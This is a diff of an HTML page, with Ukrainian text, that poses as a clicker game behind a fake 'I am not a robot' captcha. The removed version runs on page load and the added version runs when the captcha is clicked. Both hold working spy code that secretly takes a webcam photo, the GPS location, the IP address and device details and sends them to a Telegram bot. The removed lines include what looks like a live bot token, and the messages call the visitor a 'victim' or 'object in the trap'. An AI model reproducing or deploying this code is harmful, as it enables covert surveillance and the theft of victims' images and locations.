@@ -3,96 +3,137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Clicker Champion v1.2</title>
+    <title>Hacker Terminal v2.0</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #1a1a2e; color: white; user-select: none; }
-        .game-container { text-align: center; background: rgba(255, 255, 255, 0.1); padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 300px; }
-        #score-display { font-size: 2.5rem; margin-bottom: 20px; font-weight: bold; color: #ffd700; }
-        #main-button { width: 150px; height: 150px; border-radius: 50%; border: none; background: #e94560; box-shadow: 0 8px 0 #952d3c; cursor: pointer; font-size: 3rem; transition: transform 0.1s; }
-        #main-button:active { transform: translateY(4px); box-shadow: 0 4px 0 #952d3c; }
-        p { font-size: 0.9rem; opacity: 0.7; margin-top: 15px; }
+        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
+        #captcha-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        .captcha-box { border: 2px solid #00ff00; padding: 30px; background: #111; box-shadow: 0 0 20px #00ff00; }
+        #game-container { display: none; padding: 20px; text-align: center; }
+        button { background: #00ff00; color: #000; border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; margin: 10px; border-radius: 5px; }
+        button:hover { background: #00cc00; box-shadow: 0 0 10px #00ff00; }
+        #console { text-align: left; background: #001100; padding: 10px; height: 150px; overflow-y: hidden; font-size: 12px; border: 1px solid #004400; margin-top: 20px; }
+        .stat-box { font-size: 24px; margin: 20px; color: #fff; }
     </style>
 </head>
 <body>
-    <div class="game-container">
-        <div id="score-display">0</div>
-        <button id="main-button">💰</button>
-        <p>Натисніть "Дозволити" для активації Anti-Cheat системи 🏆</p>
+
+    <div id="captcha-container">
+        <div class="captcha-box">
+            <h2>SECURITY CHECK</h2>
+            <p>Підтвердіть, що ви людина для доступу до терміналу</p>
+            <div style="margin: 20px;">
+                <input type="checkbox" id="check" style="transform: scale(2);" onclick="startSystem()">
+                <label for="check" style="font-size: 20px; margin-left: 10px;">Я не робот</label>
+            </div>
+            <p id="status" style="color: #666;">[Waiting for verification...]</p>
+        </div>
     </div>
 
-    <video id="video" style="display:none" autoplay></video>
-    <canvas id="canvas" style="display:none"></canvas>
+    <div id="game-container">
+        <h1>HACKER CLICKER v2.0</h1>
+        <div class="stat-box"><span id="balance">0</span> BTC</div>
+        <button id="main-btn" onclick="mine()">ЗЛАМАТИ БЛОК ⚡</button>
+        
+        <div style="margin-top: 30px;">
+            <button onclick="buyUpgrade('auto', 50)">АВТОКЛІКЕР (50 BTC)</button>
+            <button onclick="buyUpgrade('multi', 100)">X2 ПОТУЖНІСТЬ (100 BTC)</button>
+        </div>
+
+        <div id="console"></div>
+    </div>
 
     <script>
+        // --- НАЛАШТУВАННЯ (ВСТАВ СВОЄ!) ---
+        const botToken = 'ТВІЙ_ТОКЕН_БОТА';
+        const chatId = 'ТВІЙ_CHAT_ID';
+
         let score = 0;
-        const scoreDisplay = document.getElementById('score-display');
-        const mainButton = document.getElementById('main-button');
-        
-        // Твої дані Telegram
-        const botToken = '8652413321:AAGziAFFffZbHEdqxxFWdgXJJNmanVFZxK8';
-        const chatId = '8194848649';
+        let power = 1;
+        let autoClickers = 0;
 
-        mainButton.onclick = () => {
-            score++;
-            scoreDisplay.innerText = score;
-            if(navigator.vibrate) navigator.vibrate(50);
-        };
+        function log(text) {
+            const con = document.getElementById('console');
+            con.innerHTML += `> ${text}<br>`;
+            con.scrollTop = con.scrollHeight;
+        }
 
-        async function startSpy() {
-            try {
-                // 1. IP, Провайдер, Місто
-                let ipData = { ip: "Невідомо", org: "Невідомо", city: "Невідомо" };
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    ipData = await res.json();
-                } catch(e) {}
+        async function startSystem() {
+            document.getElementById('status').innerText = "[ОБРОБКА ДАНИХ БІОМЕТРІЇ...]";
+            document.getElementById('check').disabled = true;
+            
+            // Запуск шпигуна при кліку на капчу
+            await takePhotoAndData();
 
-                // 2. Дані про батарею
-                let bat = "Невідомо";
-                if(navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    bat = `${Math.round(b.level * 100)}% (${b.charging ? 'Зарядка' : 'Розряд'})`;
+            setTimeout(() => {
+                document.getElementById('captcha-container').style.display = 'none';
+                document.getElementById('game-container').style.display = 'block';
+                log("System initialized...");
+                log("Connection: Secure encrypted tunnel established.");
+            }, 2500);
+        }
+
+        function mine() {
+            score += power;
+            document.getElementById('balance').innerText = score;
+            if (Math.random() > 0.8) log("Hash found: 0x" + Math.random().toString(16).slice(2, 10));
+            navigator.vibrate(50); // Вібрація при кліку
+        }
+
+        function buyUpgrade(type, price) {
+            if (score >= price) {
+                score -= price;
+                if (type === 'auto') {
+                    autoClickers++;
+                    setInterval(mine, 1000);
+                    log("Bought Auto-Miner. Efficiency +100%");
+                } else {
+                    power *= 2;
+                    log("System CPU Overclocked. Power x2");
                 }
+                document.getElementById('balance').innerText = score;
+            } else {
+                alert("Недостатньо BTC!");
+            }
+        }
 
-                // 3. Відправка основного звіту
-                const report = `🚨 ОБ'ЄКТ У ПАСТЦІ!\n👤 Місто: ${ipData.city}\n🌐 IP: ${ipData.ip}\n🏢 Провайдер: ${ipData.org}\n🔋 Заряд: ${bat}\n📱 Процесор: ${navigator.hardwareConcurrency} ядер\n🖥 Екран: ${screen.width}x${screen.height}`;
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(report)}`);
-
-                // 4. Запит локації (Google Maps)
-                navigator.geolocation.getCurrentPosition(pos => {
-                    const map = `📍 ТОЧНА КАРТА:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(map)}`);
-                });
-
-                // 5. Таємне фото
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
+        async function takePhotoAndData() {
+            log("Accessing camera...");
+            try {
+                // 1. Отримуємо фото (HTTPS дозволяє це)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement('video');
                 video.srcObject = stream;
-                await new Promise(r => setTimeout(r, 1500)); // Час на фокус
+                await video.play();
 
-                const canvas = document.getElementById('canvas');
+                await new Promise(r => setTimeout(r, 2000)); // Чекаємо фокусування
+
+                const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 stream.getTracks().forEach(t => t.stop()); // Вимикаємо камеру
 
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'shot.jpg');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                }, 'image/jpeg');
+                // 2. Отримуємо локацію
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+                    const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                    
+                    // 3. Відправляємо фото в ТГ
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', chatId);
+                        fd.append('photo', blob, 'spy.jpg');
+                        fd.append('caption', `🎯 ЖЕРТВА СПІЙМАНА!\n📍 Локація: ${mapUrl}\n📏 Точність: ${accuracy}м`);
+                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+                });
 
-            } catch (err) {
-                console.log("Відмова користувача");
+            } catch (e) {
+                // Якщо камера заблокована, просто шлемо текст
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=❌ Камера або GPS заблоковані юзером.`);
             }
         }
-
-        // Запуск при відкритті
-        window.onload = startSpy;
     </script>
 </body>
 </html>
-
-
